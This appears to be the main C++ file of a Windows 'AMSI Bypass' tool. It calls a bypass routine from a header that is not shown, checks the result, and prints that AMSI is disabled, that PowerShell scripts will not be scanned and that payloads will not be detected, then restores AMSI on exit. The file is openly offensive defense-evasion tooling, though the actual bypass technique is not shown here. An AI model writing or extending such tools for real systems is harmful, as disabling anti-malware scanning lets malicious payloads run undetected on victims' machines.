#include <Windows.h>
#include <stdio.h>
#include "AmsiBypass.h"

int main() {
    SetConsoleTitleA("AMSI Bypass");
    
    printf("\n");
    printf("  AMSI Bypass\n");
    printf("  ===========\n\n");
    
    // Create bypass instance
    AmsiBypass bypass;
    
    // Execute bypass
    if (bypass.BypassAll()) {
        // Verify bypass
        printf("\n");
        bypass.TestBypass();
        
        printf("\n[+] AMSI disabled\n");
        printf("[+] PowerShell scripts will not be scanned\n");
        printf("[+] Payloads will not be detected\n");
        
        printf("\n[*] Press any key to restore and exit...\n");
        (void)getchar();
        
        // Restore on exit
        printf("\n");
        bypass.RestoreAmsi();
    } else {
        printf("\n[-] Bypass failed\n");
        printf("\n[*] Press any key to exit...\n");
        (void)getchar();
        return 1;
    }
    
    printf("\n[+] Done\n");
    
    return 0;
}
